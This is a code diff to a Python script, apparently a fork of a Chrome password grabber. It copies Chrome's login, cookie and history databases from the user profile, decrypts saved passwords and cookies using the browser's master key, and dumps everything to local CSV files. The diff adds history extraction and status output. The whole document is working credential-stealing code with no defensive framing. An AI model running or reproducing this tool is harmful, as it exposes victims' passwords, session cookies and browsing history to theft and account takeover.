@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-#
+# v0.1
 # https://zhuanlan.zhihu.com/p/107801509
 # https://github.com/agentzex/chrome_v80_password_grabber
 
@@ -26,7 +26,7 @@ def decrypt_payload(cipher, payload):
 def generate_cipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)
 
-def decrypt_password(buff, master_key):
+def decrypt_value(buff, master_key):
     try:
         iv = buff[3:15]
         payload = buff[15:]
@@ -42,28 +42,52 @@ def read_decrypt_db(csv_path, sql):
     conn = sqlite3.connect("temp")
     cursor = conn.cursor()
     with open(csv_path,'a+') as data:
-        # try:
-        cursor.execute(sql)
-        for r in cursor.fetchall():
-            data1 = r[0]
-            data2 = r[1]
-            encrypted_value = r[2]
-            if encrypted_value[0:3] == b'v10':
-                # Chrome > 80
-                decrypted_value = decrypt_password(encrypted_value, master_key)
-            else:
-                # Chrome < 80
-                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value)[1].decode()
-            data.write(data1 + ',' + data2 + ',' + decrypted_value + "\n")
+        try:
+            cursor.execute(sql)
+            for r in cursor.fetchall():
+                data1 = r[0]
+                data2 = r[1]
+                encrypted_value = r[2]
+                if encrypted_value[0:3] == b'v10':
+                    # Chrome > 80
+                    decrypted_value = decrypt_value(encrypted_value, master_key)
+                else:
+                    # Chrome < 80
+                    decrypted_value = win32crypt.CryptUnprotectData(encrypted_value)[1].decode()
+                data.write(data1 + ',' + data2 + ',' + decrypted_value + "\n")
+        except Exception as e:
+            print('error')
         data.close()
-        # except Exception as e:
-        #     print('error')
     cursor.close()
     conn.close()
     try:
         os.remove("temp")
     except Exception as e:
         pass
+
+def read_db(csv_path, sql):
+    conn = sqlite3.connect("temp")
+    cursor = conn.cursor()
+    with open(csv_path, 'a+', encoding = "utf-8-sig") as data:
+        try:
+            cursor.execute(sql)
+            for r in cursor.fetchall():
+                data1 = r[0]
+                data2 = r[1]
+                data3 = r[2]
+                time = r[3]
+                data.write(data1 + ',' + data2 + ',' + str(data3) + ',' + str(time) + "\n")
+        except Exception as e:
+            print(e)
+        data.close()
+    cursor.close()
+    conn.close()
+    try:
+        os.remove("temp")
+    except Exception as e:
+        pass
+
+
 
 def main():
     # Target File path
@@ -77,19 +101,27 @@ def main():
     Chrome_history_csv_path = "Chrome_history.csv"
     Chrome_bookmarks_csv_path = "Chrome_bookmars.csv"
     # Sql
-    Login_Data_sql = "SELECT action_url, username_value, password_value FROM logins"
-    Cookies_sql = "select host_key,name,encrypted_value from cookies"
-    History_sql = ""
+    Login_Data_sql = "SELECT action_url, username_value, password_value FROM logins;"
+    Cookies_sql = "SELECT host_key, name, encrypted_value FROM cookies;"
+    History_sql = "SELECT url, title, visit_count, last_visit_time FROM urls;"
     # Get Chrome password
     target_db = os.environ['USERPROFILE'] + os.sep + Chrome_password_db_path
     shutil.copy2(target_db, "temp")
+    print("[+] Get Chrome Passwords From " + target_db)
     read_decrypt_db(Chrome_password_csv_path, Login_Data_sql)
+    print("[*] Output In " + os.getcwd() + "\\" + Chrome_password_csv_path)
     # Get Chrome Cookies
     target_db = os.environ['USERPROFILE'] + os.sep + Chrome_cookies_db_path
-    print(target_db)
     shutil.copy2(target_db, "temp")
+    print("[+] Get Chrome Cookies From " + target_db)
     read_decrypt_db(Chrome_cookies_csv_path, Cookies_sql)
-
+    print("[*] Output In " + os.getcwd() + "\\" + Chrome_cookies_csv_path)
+    # Get History
+    target_db = os.environ['USERPROFILE'] + os.sep + Chrome_history_db_path
+    shutil.copy2(target_db, "temp")
+    print("[+] Get Chrome History From " +  target_db)
+    read_db(Chrome_history_csv_path, History_sql)
+    print("[*] Output In " + os.getcwd() + "\\" + Chrome_history_csv_path)
 
 
 if __name__ == '__main__':
